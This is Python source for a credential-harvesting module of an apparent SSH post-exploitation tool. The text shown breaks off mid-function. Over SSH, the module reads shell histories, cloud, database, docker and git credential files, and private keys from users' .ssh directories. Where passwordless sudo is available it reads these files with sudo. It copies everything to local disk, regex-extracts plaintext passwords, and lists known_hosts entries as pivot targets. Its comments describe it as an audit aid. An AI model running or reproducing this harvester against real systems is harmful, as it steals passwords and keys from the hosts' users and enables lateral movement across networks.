"""Module for harvesting credentials from various sources on the remote host."""
import json
import os
import re
import shlex
from datetime import datetime, timezone
from typing import Dict, Any, List
from modules.post_exploitation.base_module import BasePostExploitationModule
from modules.logger import sshmap_logger
from modules.utils import sanitize_filename_component


class CredentialHarvesterModule(BasePostExploitationModule):
    """
    Harvests credentials from common locations on the remote host.
    
    Searches for credentials in:
    - Shell history files (.bash_history, .zsh_history, etc.)
    - .ssh directories: full dynamic enumeration of ALL key files (including
      non-standard names like id_rsa_work), fingerprinting of private keys,
      parsing of known_hosts for target hosts, and parsing of SSH client config.
    - Configuration files (.netrc, .my.cnf, etc.)
    - Environment files
    """
    
    # Maximum file size to read (50KB)
    MAX_FILE_SIZE = 50000
    
    @property
    def name(self) -> str:
        return "credential_harvester"
    
    @property
    def description(self) -> str:
        return "Harvest credentials from history, config files, and .ssh directories (private keys, known_hosts, config)"
    
    async def execute(self, ssh_session, output_dir: str) -> Dict[str, Any]:
        """Execute credential harvesting on the remote host."""
        try:
            hostname = ssh_session.get_remote_hostname()
            safe_hostname = sanitize_filename_component(hostname)
            sshmap_logger.info(f"[{self.name}] Starting credential harvesting on {hostname}")
            sshmap_logger.debug(f"[{self.name}] Output directory: {output_dir}")

            # Incremental results checkpointing: if the module hangs mid-run (e.g., remote command stalls),
            # we still want partial results on disk.
            progress_file = os.path.join(output_dir, f"{safe_hostname}_{self.name}_progress.json")
            final_file = os.path.join(output_dir, f"{safe_hostname}_{self.name}_results.json")
            checkpoint_every = 1
            try:
                checkpoint_every = int(os.environ.get("SSHMAP_CREDHARVEST_CHECKPOINT_EVERY", "1").strip() or "1")
            except Exception:
                checkpoint_every = 1
            if checkpoint_every < 0:
                checkpoint_every = 0
            _checkpoint_counter = {"n": 0}

            def _utc_ts() -> str:
                return datetime.now(timezone.utc).isoformat()

            def _atomic_write_json(path: str, payload: Dict[str, Any]) -> None:
                tmp_path = f"{path}.tmp"
                with open(tmp_path, "w", encoding="utf-8") as f:
                    json.dump(payload, f, indent=2, sort_keys=False)
                os.replace(tmp_path, path)

            def _checkpoint(stage: str, *, force: bool = False) -> None:
                """Write a progress JSON file with current partial results.

                Note: This is intentionally synchronous local IO (small) so that results persist even if
                subsequent awaits never return.
                """
                if checkpoint_every == 0 and not force:
                    return
                _checkpoint_counter["n"] += 1
                if not force and checkpoint_every > 1 and (_checkpoint_counter["n"] % checkpoint_every) != 0:
                    return

                try:
                    results["data"].setdefault("progress", {})
                    results["data"]["progress"]["stage"] = stage
                    results["data"]["progress"]["checkpoint_utc"] = _utc_ts()
                    results["data"]["progress"]["checkpoint_count"] = _checkpoint_counter["n"]
                    _atomic_write_json(progress_file, results)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Failed to write progress checkpoint: {e}")

            # Safety/behavior notes:
            # - By default this module only inspects files in the current user's $HOME.
            # - It does NOT attempt privilege escalation or use sudo to read other users' files.
            # - Optional: if SSHMAP_CREDHARVEST_ALL_HOMES=1 is set, it will *enumerate other users' homes*
            #   but will still only read files which are already readable by the current user.
            scan_all_homes_if_readable = os.environ.get("SSHMAP_CREDHARVEST_ALL_HOMES", "").strip() == "1"
            sshmap_logger.display(f"[{self.name}] Scan all user homes if readable: {'enabled' if scan_all_homes_if_readable else 'disabled'}")
            
            results = {
                "success": True,
                "hostname": hostname,
                "data": {
                    "identity": {},
                    "sudo": {"checked": False, "sudo_l": None},
                    "homes_checked": [],
                    "files_checked": [],
                    "history_files": [],
                    "config_files": [],
                    "ssh_keys": [],
                    "ssh_directory_scan": {
                        "directories_found": [],
                        "private_keys": [],
                        "public_keys": [],
                        "authorized_keys": [],
                        "known_hosts": [],
                        "config_entries": [],
                        "other_files": [],
                    },
                    "credentials_found": [],
                    "extracted_credentials": [],
                    "progress": {
                        "stage": "init",
                        "current_home": None,
                        "current_file": None,
                        "checkpoint_utc": None,
                        "checkpoint_count": 0,
                    },
                },
                "error": None
            }

            _checkpoint("initialized", force=True)

            # Collect basic identity info (helps interpret permissions in reports)
            try:
                results["data"]["progress"]["stage"] = "collect_identity"
                _checkpoint("collect_identity", force=True)
                results["data"]["identity"]["whoami"] = (await ssh_session.exec_command("whoami")).strip()
                results["data"]["identity"]["id"] = (await ssh_session.exec_command("id")).strip()
                results["data"]["identity"]["home"] = (await ssh_session.exec_command('printf %s "$HOME"')).strip()
                _checkpoint("collect_identity")
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to collect identity info: {e}")

            # Record sudo capabilities for auditing (non-interactive; never uses sudo to read files here)
            try:
                results["data"]["progress"]["stage"] = "sudo_check"
                _checkpoint("sudo_check", force=True)
                results["data"]["sudo"]["checked"] = True
                sudo_l_output = await ssh_session.exec_command(
                    "sudo -n -l 2>&1 || true"
                )
                results["data"]["sudo"]["sudo_l"] = sudo_l_output

                # Save sudo -l output to its own file for the report
                sudo_l_file = os.path.join(output_dir, f"{safe_hostname}_sudo_l.txt")
                sshmap_logger.debug(f"[{self.name}] Writing sudo audit output to: {sudo_l_file}")
                with open(sudo_l_file, "w") as f:
                    f.write(f"# sudo -l output\n# Host: {hostname}\n\n")
                    f.write(sudo_l_output)

                _checkpoint("sudo_check")

                # Log a clear summary
                if sudo_l_output.strip():
                    sshmap_logger.display(f"[{self.name}] sudo -l on {hostname}:\n{sudo_l_output.strip()}")
                else:
                    sshmap_logger.display(f"[{self.name}] sudo -l returned no output on {hostname}")
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to check sudo capabilities: {e}")
            
            # File globs/paths relative to a user's home directory
            rel_files_to_check = [
                # Shell history files
                ".bash_history",
                ".zsh_history",
                ".sh_history",
                ".history",
                # NOTE: .ssh/* files are handled by _scan_ssh_directory() below,
                # which performs a full dynamic enumeration of the entire directory
                # (finds non-standard key names, extracts fingerprints, parses
                # known_hosts and ssh config).
                # Configuration files with potential credentials
                ".netrc",
                ".my.cnf",
                ".pgpass",
                ".aws/credentials",
                ".config/gcloud/credentials.db",
                ".docker/config.json",
                ".git-credentials",
                ".gitconfig",
                # Environment files
                ".bashrc",
                ".zshrc",
                ".profile",
                ".bash_profile",
            ]

            sshmap_logger.debug(
                f"[{self.name}] Candidate files per home: {len(rel_files_to_check)}"
            )

            def _join_home(home_dir: str, rel_path: str) -> str:
                home_dir = (home_dir or "").rstrip("/")
                rel_path = rel_path.lstrip("/")
                return f"{home_dir}/{rel_path}" if home_dir else rel_path

            # Build the list of home directories to check
            homes_to_check: List[str] = []
            current_home = results["data"].get("identity", {}).get("home")
            if current_home:
                homes_to_check.append(current_home)

            if scan_all_homes_if_readable:
                try:
                    passwd = await ssh_session.exec_command("getent passwd 2>/dev/null || cat /etc/passwd")
                    for line in passwd.splitlines():
                        if not line or line.startswith("#") or ":" not in line:
                            continue
                        parts = line.split(":")
                        if len(parts) < 6:
                            continue
                        home_dir = parts[5].strip()
                        if not home_dir or home_dir == current_home:
                            continue
                        # Include /root, /home/*, /Users/*, and any other real home dirs
                        # (skip pseudo-homes like /, /bin, /dev/null, /nonexistent, /var/*)
                        skip_dirs = ("/bin", "/sbin", "/usr", "/dev", "/proc",
                                     "/sys", "/tmp", "/var", "/nonexistent", "/run")
                        if home_dir == "/" or any(home_dir.startswith(d) for d in skip_dirs):
                            continue
                        homes_to_check.append(home_dir)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Failed to enumerate user homes: {e}")

            # De-duplicate while preserving order
            seen = set()
            homes_to_check = [h for h in homes_to_check if not (h in seen or seen.add(h))]
            results["data"]["homes_checked"] = homes_to_check
            sshmap_logger.debug(
                f"[{self.name}] Homes to check: {len(homes_to_check)} ({', '.join(homes_to_check) if homes_to_check else 'none'})"
            )

            # Whether passwordless sudo is available for reading files.
            # We check if sudo -l succeeded (no password prompt) AND that
            # either ALL commands or 'head' specifically are permitted.
            sudo_l_output = results["data"]["sudo"].get("sudo_l") or ""
            _sudo_failed_markers = ("password is required", "sorry, user", "no sudo", "not allowed", "sudo: ")
            _sudo_l_lower = sudo_l_output.lower()
            _sudo_succeeded = bool(sudo_l_output.strip()) and not any(m in _sudo_l_lower for m in _sudo_failed_markers)
            # Detect which read commands are available via passwordless sudo
            _sudo_permits_all  = _sudo_succeeded and "all" in _sudo_l_lower
            _sudo_permits_cat  = _sudo_permits_all or (_sudo_succeeded and ("cat" in _sudo_l_lower))
            _sudo_permits_grep = _sudo_permits_all or (_sudo_succeeded and ("grep" in _sudo_l_lower))
            _sudo_permits_head = _sudo_permits_all or (_sudo_succeeded and ("head" in _sudo_l_lower))
            # Pick the best available sudo read command (cat > head > grep)
            if _sudo_permits_cat:
                _sudo_read_cmd_tpl  = "sudo -n cat {q} 2>/dev/null"
                _sudo_read_label    = "cat"
            elif _sudo_permits_head:
                _sudo_read_cmd_tpl  = f"sudo -n head -c {self.MAX_FILE_SIZE} {{q}} 2>/dev/null"
                _sudo_read_label    = "head"
            elif _sudo_permits_grep:
                _sudo_read_cmd_tpl  = "sudo -n grep -a '' {q} 2>/dev/null"
                _sudo_read_label    = "grep"
            else:
                _sudo_read_cmd_tpl  = None
                _sudo_read_label    = None
            sudo_available = _sudo_read_cmd_tpl is not None
            if sudo_available:
                sshmap_logger.warning(
                    f"[{self.name}] MISCONFIGURATION: passwordless sudo ('{_sudo_read_label}') "
                    f"detected on {hostname} — will use 'sudo {_sudo_read_label}' for all file reads"
                )
            elif _sudo_succeeded:
                sshmap_logger.display(
                    f"[{self.name}] sudo available on {hostname} but no read command "
                    f"(cat/head/grep) permitted — using plain cat"
                )

            # Build the primary read command once.
            # If a passwordless sudo read command is available, use it for ALL reads —
            # this is itself a misconfiguration finding and gives the most complete results.
            # Otherwise fall back to plain cat (truncated via head -c).
            def _build_read_cmd(q: str) -> tuple:
                """Returns (cmd, used_sudo: bool)."""
                if sudo_available:
                    cmd = _sudo_read_cmd_tpl.format(q=q)
                    # For cat/grep, truncate on our side after reading
                    return cmd, True
                return f"cat {q} 2>/dev/null | head -c {self.MAX_FILE_SIZE}", False

            # Helper to test/read/write a file if accessible
            async def _try_harvest_file(abs_path: str):
                if not abs_path:
                    return

                q = shlex.quote(abs_path)
                try:
                    sshmap_logger.debug(f"[{self.name}] Checking remote file: {abs_path}")
                    results["data"]["progress"]["stage"] = "file_check"
                    results["data"]["progress"]["current_file"] = abs_path
                    _checkpoint("file_check", force=True)
                    # Track checked paths for reporting
                    results["data"]["files_checked"].append(abs_path)

                    # 1. Check if file exists (using sudo stat if available, else test)
                    if sudo_available:
                        exist_cmd = f"sudo -n test -f {q} 2>/dev/null && echo 'EXISTS' || echo 'NOT_FOUND'"
                    else:
                        exist_cmd = f"test -f {q} && echo 'EXISTS' || echo 'NOT_FOUND'"
                    exist_out = await ssh_session.exec_command(exist_cmd)
                    if "NOT_FOUND" in exist_out:
                        sshmap_logger.debug(f"[{self.name}] Not found: {abs_path}")
                        _checkpoint("file_not_found")
                        return
                    sshmap_logger.debug(f"[{self.name}] Exists: {abs_path}")
                    _checkpoint("file_exists")

                    # 2. Read with the best available command
                    read_cmd, used_sudo = _build_read_cmd(q)
                    sshmap_logger.debug(
                        f"[{self.name}] Reading: {abs_path} ({'via sudo ' + _sudo_read_label if used_sudo else 'plain read'})"
                    )
                    results["data"]["progress"]["stage"] = "file_read"
                    _checkpoint("file_read", force=True)
                    content = await ssh_session.exec_command(read_cmd)
                    # Truncate on our side (needed when sudo cat/grep returns full file)
                    content = content[:self.MAX_FILE_SIZE]

                    if not content.strip():
                        sshmap_logger.debug(f"[{self.name}] Empty/unreadable: {abs_path}")
                        _checkpoint("file_empty")
                        return

                    if used_sudo:
                        sshmap_logger.warning(
                            f"[{self.name}] MISCONFIGURATION: sudo ('{_sudo_read_label}') "
                            f"read {abs_path} on {hostname}"
                        )

                    # Save the file
                    safe_filename = abs_path.replace("/", "_").replace("~", "home")
                    output_file = os.path.join(output_dir, f"{safe_hostname}_{safe_filename}")
                    sshmap_logger.debug(f"[{self.name}] Writing harvested file to: {output_file}")
                    with open(output_file, "w") as f:
                        f.write(f"# File: {abs_path}\n")
                        f.write(f"# Host: {hostname}\n")
                        if used_sudo:
                            f.write("# !! READ VIA SUDO - MISCONFIGURATION FINDING !!\n")
                        f.write("\n")
                        f.write(content)

                    # Categorize
                    entry = abs_path if not used_sudo else f"{abs_path} [via sudo - MISCONFIGURATION]"
                    if "history" in abs_path or abs_path.endswith("/.history"):
                        results["data"]["history_files"].append(entry)
                        extracted = self._extract_credentials_from_history(content)
                        if extracted:
                            # Tag each extracted cred with sudo flag
                            for c in extracted:
                                c["file"] = abs_path
                                if used_sudo:
                                    c["via_sudo"] = True
                            results["data"]["extracted_credentials"].extend(extracted)
                            results["data"]["credentials_found"].append(entry)
                    elif "/.ssh/" in abs_path:
                        results["data"]["ssh_keys"].append(entry)
                    else:
                        results["data"]["config_files"].append(entry)

                    sshmap_logger.debug(f"[{self.name}] Found and saved: {abs_path}" + (" (via sudo)" if used_sudo else ""))

                    results["data"]["progress"]["stage"] = "file_saved"
                    _checkpoint("file_saved")

                    if self._contains_credentials(content) and entry not in results["data"]["credentials_found"]:
                        results["data"]["credentials_found"].append(entry)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Error checking {abs_path}: {e}")
                    results["data"]["progress"]["stage"] = "file_error"
                    _checkpoint("file_error")
                    return
            
            # Harvest files from selected homes
            for home_dir in homes_to_check:
                sshmap_logger.display(
                    f"[{self.name}] Checking {home_dir} for {len(rel_files_to_check)} credential-related files"
                )
                results["data"]["progress"]["current_home"] = home_dir
                results["data"]["progress"]["stage"] = "home_loop"
                _checkpoint("home_loop", force=True)
                for rel_path in rel_files_to_check:
                    await _try_harvest_file(_join_home(home_dir, rel_path))

                # Full .ssh directory scan — dynamically discovers all key files
                # including non-standard names, extracts fingerprints, parses
                # known_hosts for pivot targets and ssh config for host aliases.
                await self._scan_ssh_directory(
                    ssh_session, home_dir, output_dir, safe_hostname, hostname,
                    sudo_available, _sudo_read_cmd_tpl, _sudo_read_label, results
                )

            results["data"]["progress"]["stage"] = "summarize"
            results["data"]["progress"]["current_file"] = None
            _checkpoint("summarize", force=True)
            
            # Summary
            _ssh_scan = results["data"]["ssh_directory_scan"]
            total_files = (len(results["data"]["history_files"]) +
                          len(results["data"]["config_files"]) +
                          len(results["data"]["ssh_keys"]))
            creds_count = len(results["data"]["extracted_credentials"])
            priv_keys_count = len(_ssh_scan["private_keys"])
            sshmap_logger.display(
                f"[{self.name}] Harvested {total_files} files from {hostname}. "
                f"Found potential credentials in {len(results['data']['credentials_found'])} files. "
                f"Extracted {creds_count} credentials. "
                f"SSH .ssh dirs scanned: {len(_ssh_scan['directories_found'])}, "
                f"private keys found: {priv_keys_count}."
            )
            
            # Save extracted credentials to a separate file
            if results["data"]["extracted_credentials"]:
                creds_file = os.path.join(output_dir, f"{safe_hostname}_extracted_credentials.txt")
                sshmap_logger.debug(f"[{self.name}] Writing extracted credential summary to: {creds_file}")
                with open(creds_file, "w") as f:
                    f.write(f"# Extracted Credentials from {hostname}\n")
                    f.write(f"# Total: {creds_count}\n\n")
                    for cred in results["data"]["extracted_credentials"]:
                        f.write(f"Type: {cred['type']}\n")
                        f.write(f"Source: {cred['source']}\n")
                        if cred.get("file"):
                            f.write(f"File: {cred['file']}\n")
                        if cred.get("via_sudo"):
                            f.write("!! Via sudo (misconfiguration) !!\n")
                        if 'username' in cred:
                            f.write(f"Username: {cred['username']}\n")
                        if 'password' in cred:
                            f.write(f"Password: {cred['password']}\n")
                        if 'host' in cred:
                            f.write(f"Host: {cred['host']}\n")
                        if 'command' in cred:
                            f.write(f"Command: {cred['command']}\n")
                        f.write("\n" + "-"*60 + "\n\n")

            # Write a final JSON results snapshot as well.
            try:
                results["data"]["progress"]["stage"] = "complete"
                results["data"]["progress"]["current_home"] = None
                results["data"]["progress"]["current_file"] = None
                results["data"]["progress"]["completed_utc"] = _utc_ts()
                _atomic_write_json(final_file, results)
                _atomic_write_json(progress_file, results)
                sshmap_logger.debug(f"[{self.name}] Wrote final results JSON to: {final_file}")
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to write final results JSON: {e}")
            
            return results
            
        except Exception as e:
            sshmap_logger.error(f"[{self.name}] Failed to harvest credentials: {e}")
            return {
                "success": False,
                "hostname": hostname if 'hostname' in locals() else "unknown",
                "data": None,
                "error": str(e)
            }
    
    def _contains_credentials(self, content: str) -> bool:
        """Check if content contains potential credential patterns."""
        # Simple pattern matching for common credential indicators
        credential_keywords = [
            "password", "passwd", "pwd", "secret", "token", "api_key",
            "apikey", "access_key", "private_key", "auth", "credential"
        ]
        content_lower = content.lower()
        return any(keyword in content_lower for keyword in credential_keywords)
    
    def _extract_credentials_from_history(self, content: str) -> List[Dict[str, str]]:
        """Extract credentials from shell history content."""
        credentials = []
        lines = content.split('\n')
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
            
            # Extract from sshpass commands
            # Examples: sshpass -p 'password' ssh user@host
            #           sshpass -p password ssh user@host
            sshpass_match = re.search(r'sshpass\s+-p\s+[\'"]?([^\s\'"]+)[\'"]?\s+ssh\s+(?:([^@]+)@)?(\S+)', line)
            if sshpass_match:
                password = sshpass_match.group(1)
                username = sshpass_match.group(2) if sshpass_match.group(2) else None
                host = sshpass_match.group(3)
                credentials.append({
                    'type': 'sshpass',
                    'source': 'history',
                    'password': password,
                    'username': username,
                    'host': host,
                    'command': line
                })
            
            # Extract from mysql/mariadb commands with password
            # Examples: mysql -u root -pPassword123
            #           mysql -u root -p'Password123'
            mysql_match = re.search(r'mysql.*-u\s+(\S+).*-p[\'"]?([^\s\'"]+)', line)
            if mysql_match:
                username = mysql_match.group(1)
                password = mysql_match.group(2)
                credentials.append({
                    'type': 'mysql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
            
            # Extract from psql commands with password in URL
            # Example: psql postgresql://user:password@host/db
            psql_match = re.search(r'postgresql://([^:]+):([^@]+)@(\S+)', line)
            if psql_match:
                username = psql_match.group(1)
                password = psql_match.group(2)
                host = psql_match.group(3)
                credentials.append({
                    'type': 'postgresql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Extract from FTP commands
            # Example: ftp ftp://user:password@host
            ftp_match = re.search(r'ftp://([^:]+):([^@]+)@(\S+)', line)
            if ftp_match:
                username = ftp_match.group(1)
                password = ftp_match.group(2)
                host = ftp_match.group(3)
                credentials.append({
                    'type': 'ftp',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Check for passwd command - next line might be password
            if re.match(r'^passwd\s*$', line) or re.match(r'^sudo\s+passwd', line):
                if i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    # If next line looks like a password (not a command)
                    if next_line and not next_line.startswith('#') and len(next_line) > 2:
                        # Simple heuristic: passwords typically don't start with common command prefixes
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'sudo', 'su', 'passwd']):
                            credentials.append({
                                'type': 'passwd_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Check for sudo commands - next line might be password
            # But only if the next line is short and doesn't look like another command
            if line.startswith('sudo ') and i + 1 < len(lines):
                next_line = lines[i + 1].strip()
                # Password prompts typically result in the password on the next line in history
                if next_line and not next_line.startswith('sudo') and not next_line.startswith('[sudo]'):
                    # Skip zsh extended history timestamp markers: lines like '#1749038281'
                    if re.match(r'^#\d+$', next_line):
                        continue
                    # Check if it looks like a password (short, no spaces, not a common command)
                    if len(next_line) <= 50 and ' ' not in next_line:
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'pwd', 'whoami']):
                            credentials.append({
                                'type': 'sudo_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Extract passwords from export/set commands
            # Examples: export PASSWORD=secret123
            #           export DB_PASS="secret123"
            export_match = re.search(r'(?:export|set)\s+(\w*(?:PASS|PASSWORD|PWD|SECRET|TOKEN|KEY)\w*)\s*=\s*[\'"]?([^\s\'"]+)', line, re.IGNORECASE)
            if export_match:
                var_name = export_match.group(1)
                value = export_match.group(2)
                credentials.append({
                    'type': 'environment_variable',
                    'source': 'history',
                    'variable': var_name,
                    'password': value,
                    'command': line
                })
            
            # Extract from curl/wget with basic auth
            # Example: curl -u user:password http://example.com
            curl_auth_match = re.search(r'(?:curl|wget).*-u\s+([^:]+):([^\s]+)', line)
            if curl_auth_match:
                username = curl_auth_match.group(1)
                password = curl_auth_match.group(2)
                credentials.append({
                    'type': 'http_basic_auth',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })

            # Extract from chpasswd patterns
            # Examples:
            #   echo root:Temporal01 | chpasswd
            #   echo "admin:P@ssw0rd" | sudo chpasswd
            #   printf 'user:pass\n' | chpasswd
            chpasswd_match = re.search(
                r'(?:echo|printf)\s+[\'"]?([^:\s\'"]+):([^\s\|\'"\n]+)[\'"]?\s*\|.*chpasswd',
                line
            )
            if chpasswd_match:
                username = chpasswd_match.group(1)
                password = chpasswd_match.group(2).rstrip("'\"")
                credentials.append({
                    'type': 'chpasswd',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
        
        return credentials

    # ------------------------------------------------------------------
    # .ssh directory scanning helpers
    # ------------------------------------------------------------------

    async def _scan_ssh_directory(
        self,
        ssh_session,
        home_dir: str,
        output_dir: str,
        safe_hostname: str,
        hostname: str,
        sudo_available: bool,
        sudo_read_cmd_tpl,
        sudo_read_label,
        results: Dict[str, Any],
    ) -> None:
        """Enumerate and harvest ALL files inside a user's .ssh directory.

        Discovers non-standard key file names (e.g. id_rsa_work, my_server_key),
        classifies each file, extracts SSH private-key fingerprints and type,
        parses known_hosts for reachable targets, and parses the SSH client
        config for Host aliases and credentials.
        """
        ssh_dir = f"{home_dir.rstrip('/')}/.ssh"
        q_ssh_dir = shlex.quote(ssh_dir)
        ssh_scan = results["data"]["ssh_directory_scan"]

        # 1. Verify the directory exists
        if sudo_available:
            exist_cmd = f"sudo -n test -d {q_ssh_dir} 2>/dev/null && echo YES || echo NO"
        else:
            exist_cmd = f"test -d {q_ssh_dir} && echo YES || echo NO"
        try:
            exist_out = (await ssh_session.exec_command(exist_cmd)).strip()
        except Exception as e:
            sshmap_logger.debug(f"[{self.name}] Cannot check {ssh_dir}: {e}")
            return

        if exist_out != "YES":
            sshmap_logger.debug(f"[{self.name}] .ssh directory not found: {ssh_dir}")
            return

        ssh_scan["directories_found"].append(ssh_dir)
        sshmap_logger.display(f"[{self.name}] Scanning .ssh directory: {ssh_dir}")

        # 2. List all regular files (depth 2 to catch sub-folders like .ssh/keys/)
        if sudo_available:
            list_cmd = f"sudo -n find {q_ssh_dir} -maxdepth 2 -type f 2>/dev/null"
        else:
            list_cmd = f"find {q_ssh_dir} -maxdepth 2 -type f 2>/dev/null"
        try:
            file_list_raw = await ssh_session.exec_command(list_cmd)
            files = [f.strip() for f in file_list_raw.splitlines() if f.strip()]
        except Exception as e:
            sshmap_logger.debug(f"[{self.name}] find failed for {ssh_dir}: {e}")
            files = []

        # Fallback: ls -1a if find returned nothing
        if not files:
            try:
                ls_cmd = f"ls -1 {q_ssh_dir} 2>/dev/null"
                ls_out = await ssh_session.exec_command(ls_cmd)
                files = [
                    f"{ssh_dir}/{f.strip()}"
                    for f in ls_out.splitlines()
                    if f.strip() and f.strip() not in (".", "..")
                ]
            except Exception:
                pass

        if not files:
            sshmap_logger.debug(f"[{self.name}] .ssh directory empty or unreadable: {ssh_dir}")
            return

        sshmap_logger.display(f"[{self.name}] Found {len(files)} file(s) in {ssh_dir}")

        already_checked = set(results["data"].get("files_checked", []))

        for file_path in files:
            q = shlex.quote(file_path)
            fname = os.path.basename(file_path)
            results["data"]["files_checked"].append(file_path)

            # Read file content
            if sudo_available and sudo_read_cmd_tpl:
                read_cmd = sudo_read_cmd_tpl.format(q=q)
            else:
                read_cmd = f"cat {q} 2>/dev/null | head -c {self.MAX_FILE_SIZE}"
            try:
                content = await ssh_session.exec_command(read_cmd)
                content = content[:self.MAX_FILE_SIZE]
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to read {file_path}: {e}")
                continue

            if not content.strip():
                sshmap_logger.debug(f"[{self.name}] Empty/unreadable .ssh file: {file_path}")
                continue

            if sudo_available:
                sshmap_logger.warning(
                    f"[{self.name}] MISCONFIGURATION: sudo ('{sudo_read_label}') "
                    f"read {file_path} on {hostname}"
                )

            # Save to output dir (skip if already saved by the main harvest loop)
            output_file = None
            if file_path not in already_checked:
                safe_fname = file_path.replace("/", "_").replace("~", "home")
                output_file = os.path.join(output_dir, f"{safe_hostname}_{safe_fname}")
                try:
                    with open(output_file, "w", encoding="utf-8") as fh:
                        fh.write(f"# File: {file_path}\n# Host: {hostname}\n")
                        if sudo_available:
                            fh.write("# !! READ VIA SUDO - MISCONFIGURATION FINDING !!\n")
                        fh.write("\n")
                        fh.write(content)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Failed to save {file_path}: {e}")
                    output_file = None

            entry: Dict[str, Any] = {
                "path": file_path,
                "saved_as": output_file,
                "via_sudo": sudo_available,
            }

            # ---- classify ----

            if "PRIVATE KEY" in content:
                # Private key file
                key_type = self._detect_ssh_key_type(content)
                encrypted = "ENCRYPTED" in content or "Proc-Type" in content
                fingerprint = await self._get_ssh_key_fingerprint(
                    ssh_session, file_path, sudo_available
                )
                entry.update({
                    "key_type": key_type,
                    "encrypted": encrypted,
                    "fingerprint": fingerprint,
                })
                ssh_scan["private_keys"].append(entry)
                enc_label = "encrypted" if encrypted else "plaintext"
                sshmap_logger.display(
                    f"[{self.name}] \U0001f511 Private key: {file_path} "
                    f"[{key_type}, {enc_label}]"
                    + (f" | fingerprint: {fingerprint}" if fingerprint else "")
                    + (" | !! via sudo - MISCONFIGURATION" if sudo_available else "")
                )
                cred_entry = (
                    f"{file_path} [PRIVATE KEY | {key_type} | {enc_label}"
                    + (" | via sudo - MISCONFIGURATION" if sudo_available else "")
                    + "]"
                )
                if cred_entry not in results["data"]["credentials_found"]:
                    results["data"]["credentials_found"].append(cred_entry)
                if cred_entry not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(cred_entry)

            elif any(
                content.strip().startswith(pfx)
                for pfx in ("ssh-rsa", "ssh-dss", "ssh-ed25519", "ecdsa-sha2", "sk-ssh")
            ):
                # Public key (single-line or multi-line authorized_keys style)
                entry["key_count"] = sum(
                    1 for ln in content.splitlines()
                    if ln.strip() and not ln.startswith("#")
                )
                ssh_scan["public_keys"].append(entry)
                if file_path not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(file_path)

            elif fname in ("authorized_keys", "authorized_keys2"):
                key_count = sum(
                    1 for ln in content.splitlines()
                    if ln.strip() and not ln.startswith("#")
                )
                entry["key_count"] = key_count
                ssh_scan["authorized_keys"].append(entry)
                sshmap_logger.display(
                    f"[{self.name}] authorized_keys: {key_count} key(s) in {file_path}"
                )
                if file_path not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(file_path)

            elif fname == "known_hosts":
                hosts = self._parse_ssh_known_hosts(content)
                entry["hosts"] = hosts
                ssh_scan["known_hosts"].append(entry)
                sshmap_logger.display(
                    f"[{self.name}] known_hosts: {len(hosts)} target host(s) in {file_path}: "
                    + ", ".join(hosts[:10])
                    + (" ..." if len(hosts) > 10 else "")
                )
                if file_path not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(file_path)

            elif fname == "config":
                config_hosts = self._parse_ssh_client_config(content)
                entry["host_entries"] = config_hosts
                ssh_scan["config_entries"].append(entry)
                sshmap_logger.display(
                    f"[{self.name}] ssh config: {len(config_hosts)} Host block(s) in {file_path}"
                )
                # Check for credentials embedded in config (e.g. IdentityFile, ProxyCommand with passwords)
                if self._contains_credentials(content):
                    if file_path not in results["data"]["credentials_found"]:
                        results["data"]["credentials_found"].append(file_path)
                if file_path not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(file_path)

            else:
                ssh_scan["other_files"].append(entry)
                if file_path not in results["data"]["ssh_keys"]:
                    results["data"]["ssh_keys"].append(file_path)

    def _detect_ssh_key_type(self, content: str) -> str:
        """Detect SSH private key type from PEM or OpenSSH header."""
        if "RSA PRIVATE KEY" in content:
            return "rsa"
        if "DSA PRIVATE KEY" in content:
            return "dsa"
        if "EC PRIVATE KEY" in content:
            return "ecdsa"
        if "OPENSSH PRIVATE KEY" in content:
            # New OpenSSH format — try to infer algorithm from embedded public-key line
            for line in content.splitlines():
                line = line.strip()
                if "ed25519" in line:
                    return "ed25519"
                if "ecdsa" in line:
                    return "ecdsa"
                if line.startswith("ssh-rsa"):
                    return "rsa"
                if line.startswith("ssh-dss"):
                    return "dsa"
            return "openssh"  # format known, algorithm not determined
        if "PRIVATE KEY" in content:
            return "pkcs8"
        return "unknown"

    async def _get_ssh_key_fingerprint(
        self,
        ssh_session,
        key_path: str,
        sudo_available: bool,
    ) -> str:
        """Try to obtain the fingerprint of an SSH key using ssh-keygen -l."""
        q = shlex.quote(key_path)
        if sudo_available:
            cmd = f"sudo -n ssh-keygen -l -f {q} 2>/dev/null"
        else:
            cmd = f"ssh-keygen -l -f {q} 2>/dev/null"
        try:
            out = (await ssh_session.exec_command(cmd)).strip()
            return out if out else None
        except Exception:
            return None

    def _parse_ssh_known_hosts(self, content: str) -> List[str]:
        """Extract unique hostnames / IPs from a known_hosts file."""
        hosts: List[str] = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) < 3:
                continue
            host_field = parts[0]
